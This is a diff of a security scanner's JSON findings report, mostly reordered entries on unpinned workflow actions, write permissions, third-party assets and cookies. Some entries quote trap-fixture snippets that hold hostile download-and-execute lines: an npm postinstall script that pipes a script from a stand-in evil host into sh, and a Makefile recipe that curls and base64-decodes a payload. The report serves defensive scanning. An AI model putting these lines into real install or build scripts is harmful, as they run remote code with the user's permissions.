-      "tool": "agent-checks",
-      "severity": "low",
       "file": "FEATURES.md",
       "line": 268,
       "title": "Download-and-execute (pipe to shell)",
@@ -8704,8 +8694,161 @@
     {
       "tool": "agent-checks",
       "severity": "low",
+      "file": "repobeagle.py",
+      "line": 321,
+      "title": "Code reads .env (project config, not a credential store)",
+      "snippet": "add(\"high\", \"Filesystem access to root/home directory\", sval, \"The server can read and write your entire disk/home, including keys and .env files.\")",
+      "meaning": "Reading the repo's own .env is normal; review only that the values are not sent somewhere unexpected.",
+      "rule": "Code reads .env"
+    },
+    {
+      "tool": "agent-checks",
+      "severity": "low",
+      "file": "tests/fixtures/trap-gha/.github/workflows/after.yml",
+      "line": 10,
+      "title": "gha-unpinned-action: 1 action(s) on a tag/branch, not a commit SHA",
+      "snippet": "- uses: actions/github-script@v7",
+      "meaning": "Tags can be moved to malicious code (e.g. tj-actions/changed-files, 2025).",
+      "rule": "gha-unpinned-action",
+      "remediation": "pin `uses:` to a full 40-character commit SHA"
+    },
+    {
+      "tool": "agent-checks",
+      "severity": "low",
+      "file": "tests/fixtures/trap-gha/.github/workflows/ci.yml",
+      "line": 10,
+      "title": "gha-unpinned-action: 1 action(s) on a tag/branch, not a commit SHA",
+      "snippet": "- uses: actions/checkout@v4",
+      "meaning": "Tags can be moved to malicious code (e.g. tj-actions/changed-files, 2025).",
+      "rule": "gha-unpinned-action",
+      "remediation": "pin `uses:` to a full 40-character commit SHA"
+    },
+    {
+      "tool": "agent-checks",
+      "severity": "low",
+      "file": ".github/workflows/self-scan.yml",
+      "line": 15,
+      "title": "gha-unpinned-action: 1 action(s) on a tag/branch, not a commit SHA",
+      "snippet": "uses: javierbits/repobeagle/.github/workflows/scan.yml@v1.170.1",
+      "meaning": "Tags can be moved to malicious code (e.g. tj-actions/changed-files, 2025).",
+      "rule": "gha-unpinned-action",
+      "remediation": "pin `uses:` to a full 40-character commit SHA"
+    },
+    {
+      "tool": "agent-checks",
+      "severity": "low",
+      "file": "tests/fixtures/trap-gha/.github/workflows/ci.yml",
+      "line": 5,
+      "title": "gha-write-permissions: workflow token has write permissions",
+      "snippet": "permissions: write-all",
+      "meaning": "A compromised step can push code or publish packages.",
+      "rule": "gha-write-permissions",
+      "remediation": "add a least-privilege `permissions:` block to the workflow"
+    },
+    {
+      "tool": "agent-checks",
+      "severity": "low",
+      "file": ".github/workflows/self-scan.yml",
+      "line": 11,
+      "title": "gha-write-permissions: workflow token has write permissions",
+      "snippet": "contents: write # publish the badge branch",
+      "meaning": "A compromised step can push code or publish packages.",
+      "rule": "gha-write-permissions",
+      "remediation": "add a least-privilege `permissions:` block to the workflow"
+    },
+    {
+      "tool": "agent-checks",
+      "severity": "low",
+      "file": ".github/workflows/self-scan.yml",
+      "line": 13,
+      "title": "gha-write-permissions: workflow token has write permissions",
+      "snippet": "id-token: write # keyless-sign the report",
+      "meaning": "A compromised step can push code or publish packages.",
+      "rule": "gha-write-permissions",
+      "remediation": "add a least-privilege `permissions:` block to the workflow"
+    },
+    {
+      "tool": "agent-checks",
+      "severity": "low",
+      "file": ".github/workflows/image.yml",
+      "line": 11,
+      "title": "gha-write-permissions: workflow token has write permissions",
+      "snippet": "packages: write",
+      "meaning": "A compromised step can push code or publish packages.",
+      "rule": "gha-write-permissions",
+      "remediation": "add a least-privilege `permissions:` block to the workflow"
+    },
+    {
+      "tool": "agent-checks",
+      "severity": "low",
+      "file": ".github/workflows/image.yml",
+      "line": 12,
+      "title": "gha-write-permissions: workflow token has write permissions",
+      "snippet": "id-token: write # keyless signing of the pushed image",
+      "meaning": "A compromised step can push code or publish packages.",
+      "rule": "gha-write-permissions",
+      "remediation": "add a least-privilege `permissions:` block to the workflow"
+    },
+    {
+      "tool": "agent-checks",
+      "severity": "low",
+      "file": ".github/workflows/scan.yml",
+      "line": 91,
+      "title": "gha-write-permissions: workflow token has write permissions",
+      "snippet": "contents: write",
+      "meaning": "A compromised step can push code or publish packages.",
+      "rule": "gha-write-permissions",
+      "remediation": "add a least-privilege `permissions:` block to the workflow"
+    },
+    {
+      "tool": "agent-checks",
+      "severity": "low",
+      "file": ".github/workflows/scan.yml",
+      "line": 93,
+      "title": "gha-write-permissions: workflow token has write permissions",
+      "snippet": "id-token: write",
+      "meaning": "A compromised step can push code or publish packages.",
+      "rule": "gha-write-permissions",
+      "remediation": "add a least-privilege `permissions:` block to the workflow"
+    },
+    {
+      "tool": "agent-checks",
+      "severity": "low",
+      "file": "tests/fixtures/trap-build/Makefile",
+      "line": 2,
+      "title": "make-just-hooks: Make/just target downloads, decodes or opens sockets",
+      "snippet": "curl -s https://x.example.invalid/m | base64 -d > tool",
+      "meaning": "Runs if you invoke make/just; review before building.",
+      "rule": "make-just-hooks",
+      "remediation": "review the Make/just recipe; build targets should build, not download or open sockets"
+    },
+    {
+      "tool": "agent-checks",
+      "severity": "low",
+      "file": "tests/fixtures/trap-binary/src/helper.js",
+      "line": 1,
+      "title": "minified-outside-dist: minified code in a source path",
+      "snippet": "a0=function(b){return(b*0)};a1=function(b){return(b*1)};a2=function(b){return(b*...",
+      "meaning": "Minified code outside build output can't be reviewed; check it matches its source.",
+      "rule": "minified-outside-dist",
+      "remediation": "move minified files under dist/build, or keep the readable source next to them"
+    },
+    {
+      "tool": "agent-checks",
+      "severity": "low",
       "file": ".github/workflows/nightly.yml",
       "line": 19,
+      "title": "gha-unpinned-action: 3 action(s) on a tag/branch, not a commit SHA",
+      "snippet": "- uses: actions/checkout@v4",
+      "meaning": "Tags can be moved to malicious code (e.g. tj-actions/changed-files, 2025).",
+      "rule": "gha-unpinned-action",
+      "remediation": "pin `uses:` to a full 40-character commit SHA"
+    },
+    {
+      "tool": "agent-checks",
+      "severity": "low",
+      "file": ".github/workflows/arch.yml",
+      "line": 38,
       "title": "gha-unpinned-action: 3 action(s) on a tag/branch, not a commit SHA",
       "snippet": "- uses: actions/checkout@v4",
       "meaning": "Tags can be moved to malicious code (e.g. tj-actions/changed-files, 2025).",
@@ -8737,9 +8880,9 @@
     {
       "tool": "agent-checks",
       "severity": "low",
-      "file": ".github/workflows/arch.yml",
+      "file": ".github/workflows/toolchain.yml",
       "line": 38,
-      "title": "gha-unpinned-action: 3 action(s) on a tag/branch, not a commit SHA",
+      "title": "gha-unpinned-action: 2 action(s) on a tag/branch, not a commit SHA",
       "snippet": "- uses: actions/checkout@v4",
       "meaning": "Tags can be moved to malicious code (e.g. tj-actions/changed-files, 2025).",
       "rule": "gha-unpinned-action",
@@ -8748,109 +8891,10 @@
     {
       "tool": "agent-checks",
       "severity": "low",
-      "file": ".github/workflows/self-scan.yml",
-      "line": 11,
-      "title": "gha-write-permissions: workflow token has write permissions",
-      "snippet": "contents: write # publish the badge branch",
-      "meaning": "A compromised step can push code or publish packages.",
-      "rule": "gha-write-permissions",
-      "remediation": "add a least-privilege `permissions:` block to the workflow"
-    },
-    {
-      "tool": "agent-checks",
-      "severity": "low",
-      "file": ".github/workflows/self-scan.yml",
-      "line": 13,
-      "title": "gha-write-permissions: workflow token has write permissions",
-      "snippet": "id-token: write # keyless-sign the report",
-      "meaning": "A compromised step can push code or publish packages.",
-      "rule": "gha-write-permissions",
-      "remediation": "add a least-privilege `permissions:` block to the workflow"
-    },
-    {
-      "tool": "agent-checks",
-      "severity": "low",
-      "file": ".github/workflows/scan.yml",
-      "line": 91,
-      "title": "gha-write-permissions: workflow token has write permissions",
-      "snippet": "contents: write",
-      "meaning": "A compromised step can push code or publish packages.",
-      "rule": "gha-write-permissions",
-      "remediation": "add a least-privilege `permissions:` block to the workflow"
-    },
-    {
-      "tool": "agent-checks",
-      "severity": "low",
-      "file": ".github/workflows/scan.yml",
-      "line": 93,
-      "title": "gha-write-permissions: workflow token has write permissions",
-      "snippet": "id-token: write",
-      "meaning": "A compromised step can push code or publish packages.",
-      "rule": "gha-write-permissions",
-      "remediation": "add a least-privilege `permissions:` block to the workflow"
-    },
-    {
-      "tool": "agent-checks",
-      "severity": "low",
-      "file": ".github/workflows/image.yml",
-      "line": 11,
-      "title": "gha-write-permissions: workflow token has write permissions",
-      "snippet": "packages: write",
-      "meaning": "A compromised step can push code or publish packages.",
-      "rule": "gha-write-permissions",
-      "remediation": "add a least-privilege `permissions:` block to the workflow"
-    },
-    {
-      "tool": "agent-checks",
-      "severity": "low",
-      "file": ".github/workflows/image.yml",
-      "line": 12,
-      "title": "gha-write-permissions: workflow token has write permissions",
-      "snippet": "id-token: write # keyless signing of the pushed image",
-      "meaning": "A compromised step can push code or publish packages.",
-      "rule": "gha-write-permissions",
-      "remediation": "add a least-privilege `permissions:` block to the workflow"
-    },
-    {
-      "tool": "agent-checks",
-      "severity": "low",
-      "file": "tests/fixtures/trap-gha/.github/workflows/ci.yml",
-      "line": 5,
-      "title": "gha-write-permissions: workflow token has write permissions",
-      "snippet": "permissions: write-all",
-      "meaning": "A compromised step can push code or publish packages.",
-      "rule": "gha-write-permissions",
-      "remediation": "add a least-privilege `permissions:` block to the workflow"
-    },
-    {
-      "tool": "agent-checks",
-      "severity": "low",
-      "file": ".github/workflows/self-scan.yml",
-      "line": 15,
-      "title": "gha-unpinned-action: 1 action(s) on a tag/branch, not a commit SHA",
-      "snippet": "uses: javierbits/repobeagle/.github/workflows/scan.yml@v1.170.1",
-      "meaning": "Tags can be moved to malicious code (e.g. tj-actions/changed-files, 2025).",
-      "rule": "gha-unpinned-action",
-      "remediation": "pin `uses:` to a full 40-character commit SHA"
-    },
-    {
-      "tool": "agent-checks",
-      "severity": "low",
-      "file": "tests/fixtures/trap-gha/.github/workflows/after.yml",
-      "line": 10,
-      "title": "gha-unpinned-action: 1 action(s) on a tag/branch, not a commit SHA",
+      "file": ".github/workflows/issue-claim.yml",
+      "line": 27,
+      "title": "gha-unpinned-action: 2 action(s) on a tag/branch, not a commit SHA",
       "snippet": "- uses: actions/github-script@v7",
-      "meaning": "Tags can be moved to malicious code (e.g. tj-actions/changed-files, 2025).",
-      "rule": "gha-unpinned-action",
-      "remediation": "pin `uses:` to a full 40-character commit SHA"
-    },
-    {
-      "tool": "agent-checks",
-      "severity": "low",
-      "file": "tests/fixtures/trap-gha/.github/workflows/ci.yml",
-      "line": 10,
-      "title": "gha-unpinned-action: 1 action(s) on a tag/branch, not a commit SHA",
-      "snippet": "- uses: actions/checkout@v4",
       "meaning": "Tags can be moved to malicious code (e.g. tj-actions/changed-files, 2025).",
       "rule": "gha-unpinned-action",
       "remediation": "pin `uses:` to a full 40-character commit SHA"
@@ -8880,20 +8924,9 @@
     {
       "tool": "agent-checks",
       "severity": "low",
-      "file": ".github/workflows/issue-claim.yml",
-      "line": 27,
-      "title": "gha-unpinned-action: 2 action(s) on a tag/branch, not a commit SHA",
-      "snippet": "- uses: actions/github-script@v7",
-      "meaning": "Tags can be moved to malicious code (e.g. tj-actions/changed-files, 2025).",
-      "rule": "gha-unpinned-action",
-      "remediation": "pin `uses:` to a full 40-character commit SHA"
-    },
-    {
-      "tool": "agent-checks",
-      "severity": "low",
-      "file": ".github/workflows/toolchain.yml",
-      "line": 38,
-      "title": "gha-unpinned-action: 2 action(s) on a tag/branch, not a commit SHA",
+      "file": ".github/workflows/image.yml",
+      "line": 20,
+      "title": "gha-unpinned-action: 7 action(s) on a tag/branch, not a commit SHA",
       "snippet": "- uses: actions/checkout@v4",
       "meaning": "Tags can be moved to malicious code (e.g. tj-actions/changed-files, 2025).",
       "rule": "gha-unpinned-action",
@@ -8909,39 +8942,6 @@
       "meaning": "Tags can be moved to malicious code (e.g. tj-actions/changed-files, 2025).",
       "rule": "gha-unpinned-action",
       "remediation": "pin `uses:` to a full 40-character commit SHA"
-    },
-    {
-      "tool": "agent-checks",
-      "severity": "low",
-      "file": ".github/workflows/image.yml",
-      "line": 20,
-      "title": "gha-unpinned-action: 7 action(s) on a tag/branch, not a commit SHA",
-      "snippet": "- uses: actions/checkout@v4",
-      "meaning": "Tags can be moved to malicious code (e.g. tj-actions/changed-files, 2025).",
-      "rule": "gha-unpinned-action",
-      "remediation": "pin `uses:` to a full 40-character commit SHA"
-    },
-    {
-      "tool": "agent-checks",
-      "severity": "low",
-      "file": "tests/fixtures/trap-build/Makefile",
-      "line": 2,
-      "title": "make-just-hooks: Make/just target downloads, decodes or opens sockets",
-      "snippet": "curl -s https://x.example.invalid/m | base64 -d > tool",
-      "meaning": "Runs if you invoke make/just; review before building.",
-      "rule": "make-just-hooks",
-      "remediation": "review the Make/just recipe; build targets should build, not download or open sockets"
-    },
-    {
-      "tool": "agent-checks",
-      "severity": "low",
-      "file": "tests/fixtures/trap-binary/src/helper.js",
-      "line": 1,
-      "title": "minified-outside-dist: minified code in a source path",
-      "snippet": "a0=function(b){return(b*0)};a1=function(b){return(b*1)};a2=function(b){return(b*...",
-      "meaning": "Minified code outside build output can't be reviewed; check it matches its source.",
-      "rule": "minified-outside-dist",
-      "remediation": "move minified files under dist/build, or keep the readable source next to them"
     },
     {
       "tool": "telemetry",
@@ -9914,20 +9914,20 @@
     {
       "tool": "privacy",
       "severity": "info",
-      "file": "repobeagle.py",
-      "line": 4766,
+      "file": "pyproject.toml",
+      "line": 21,
       "title": "external-endpoint: github.com",
-      "snippet": "base = f\"https://github.com/{repo}/issues/new\"",
+      "snippet": "Homepage = \"https://github.com/javierbits/repobeagle\"",
       "meaning": "Network destination github.com (known platform/infrastructure). Seen 43 times.",
       "rule": "external-endpoint"
     },
     {
       "tool": "privacy",
       "severity": "info",
-      "file": "tests/test_run.py",
-      "line": 43,
+      "file": "tests/test_supply_chain.py",
+      "line": 66,
       "title": "external-endpoint: gitlab.com",
-      "snippet": "assert rb._repo_url(\"https://gitlab.com/a/b.git\") == \"https://gitlab.com/a/b\"",
+      "snippet": "\".gitmodules\": '[submodule \"a\"]\\n\\tpath = a\\n\\turl = https://gitlab.com/other/a.git\\n'",
       "meaning": "Network destination gitlab.com (known platform/infrastructure). Seen 2 times.",
       "rule": "external-endpoint"
     },
@@ -10096,10 +10096,10 @@
     {
       "tool": "privacy",
       "severity": "info",
-      "file": "tests/fixtures/workspace-two/packages/b/index.html",
+      "file": "tests/fixtures/workspace-two/packages/a/index.html",
       "line": 1,
       "title": "third-party-script: a.example.com",
-      "snippet": "<!doctype html><html><head><script src=\"https://a.example.com/lib.js\"></script></head><body>b</body></html>",
+      "snippet": "<!doctype html><html><head><script src=\"https://a.example.com/lib.js\"></script></head><body>a</body></html>",
       "meaning": "Loads executable script from a.example.com: it runs with page privileges and can read cookies/DOM and beacon data. Seen 2 times.",
       "rule": "third-party-script",
       "remediation": "self-host the asset, or document and gate the host behind consent"
@@ -10239,11 +10239,11 @@
     {
       "tool": "privacy",
       "severity": "info",
-      "file": "tests/fixtures/trap-privacy/web/index.html",
-      "line": 6,
+      "file": "tests/fixtures/trap-privacy/web/style.css",
+      "line": 1,
       "title": "third-party-stylesheet: css.unknown-cdn.dev",
-      "snippet": "<link rel=\"stylesheet\" href=\"https://css.unknown-cdn.dev/app.css\">",
-      "meaning": "Stylesheet loaded from css.unknown-cdn.dev: it sees your IP/referrer and can pull fonts/images from its own servers. Seen 2 times.",
+      "snippet": "@import url(\"https://css.unknown-cdn.dev/base.css\");",
+      "meaning": "CSS @import from css.unknown-cdn.dev: sees your IP/referrer and can chain further requests. Seen 2 times.",
       "rule": "third-party-stylesheet",
       "remediation": "self-host the asset, or document and gate the host behind consent"
     },
@@ -10294,11 +10294,11 @@
     {
       "tool": "privacy",
       "severity": "info",
-      "file": "tests/fixtures/trap-privacy/web/index.html",
-      "line": 12,
+      "file": "tests/fixtures/trap-privacy/web/widget.tsx",
+      "line": 2,
       "title": "third-party-media: images.unknown-cdn.dev",
-      "snippet": "<img src=\"https://images.unknown-cdn.dev/hero.png\" srcset=\"https://images.unknown-cdn.dev/h***@2x.png 2x\" alt=\"hero\">",
-      "meaning": "Responsive media from images.unknown-cdn.dev: it sees your IP and the page URL. Seen 3 times.",
+      "snippet": "export const Widget = () => <img src=\"https://images.unknown-cdn.dev/logo.png\" alt=\"\" />;",
+      "meaning": "Media loaded from images.unknown-cdn.dev: it sees your IP and the page URL, and may set/send cookies or beacons. Seen 3 times.",
       "rule": "third-party-media",
       "remediation": "self-host the asset, or document and gate the host behind consent"
     },
@@ -10591,10 +10591,10 @@
     {
       "tool": "privacy",
       "severity": "info",
-      "file": "tests/fixtures/trap-privacy/web/analytics.js",
-      "line": 4,
+      "file": "tests/fixtures/trap-privacy/web/consent.html",
+      "line": 3,
       "title": "cookie-flags: document.cookie without Secure/SameSite",
-      "snippet": "document.cookie = \"theme=dark\";",
+      "snippet": "<script>document.cookie = \"theme=light\";</script>",
       "meaning": "JavaScript cookie without Secure/SameSite: sent in clear or cross-site (HttpOnly cannot be set from JS). Seen 13 times.",
       "rule": "cookie-flags",
       "remediation": "set `Secure; HttpOnly; SameSite=Lax` (or Strict) when writing the cookie"
@@ -10624,10 +10624,10 @@
     {
       "tool": "privacy",
       "severity": "info",
-      "file": "tests/fixtures/trap-privacy/web/analytics.js",
-      "line": 4,
+      "file": "tests/fixtures/trap-privacy/web/consent.html",
+      "line": 3,
       "title": "cookie-write: document.cookie",
-      "snippet": "document.cookie = \"theme=dark\";",
+      "snippet": "<script>document.cookie = \"theme=light\";</script>",
       "meaning": "JavaScript writes a cookie (persistent client-side identifier; check lifetime and consent). Seen 10 times.",
       "rule": "cookie-write",
       "remediation": "prefer HttpOnly cookies set by the server when the value is not needed in JS"
@@ -11247,25 +11247,6 @@
     {
       "tool": "agent-checks",
       "severity": "critical",
-      "file": "tests/fixtures/trap-npm/package.json",
-      "line": 8,
-      "title": "npm lifecycle script 'postinstall' runs automatically on install",
-      "snippet": "\"postinstall\": \"curl -fsSL https://evil.example.invalid/x.sh | sh && node scripts/setup.js\"",
-      "meaning": "npm runs this on `npm install` with your user's permissions.",
-      "rule": "npm lifecycle script 'postinstall' runs automatically on install",
-      "remediation": "run `npm ci --ignore-scripts`, or review the script; `postinstall` runs automatically on every install",
-      "suppressed": true,
-      "suppression": {
-        "rule": "npm lifecycle script*",
-        "reason": "trap-npm fixture",
-        "until": null,
-        "line": 10,
-        "status": "active"
-      }
-    },
-    {
-      "tool": "agent-checks",
-      "severity": "critical",
       "file": "tests/fixtures/trap-skill/SKILL.md",
       "line": 8,
       "title": "Zero-width characters (85) spliced inside words",
@@ -11317,6 +11298,25 @@
         "reason": "trap-skill fixture",
         "until": null,
         "line": 9,
+        "status": "active"
+      }
+    },
+    {
+      "tool": "agent-checks",
+      "severity": "critical",
+      "file": "tests/fixtures/trap-npm/package.json",
+      "line": 8,
+      "title": "npm lifecycle script 'postinstall' runs automatically on install",
+      "snippet": "\"postinstall\": \"curl -fsSL https://evil.example.invalid/x.sh | sh && node scripts/setup.js\"",
+      "meaning": "npm runs this on `npm install` with your user's permissions.",
+      "rule": "npm lifecycle script 'postinstall' runs automatically on install",
+      "remediation": "run `npm ci --ignore-scripts`, or review the script; `postinstall` runs automatically on every install",
+      "suppressed": true,
+      "suppression": {
+        "rule": "npm lifecycle script*",
+        "reason": "trap-npm fixture",
+        "until": null,
+        "line": 10,
         "status": "active"
       }
     },
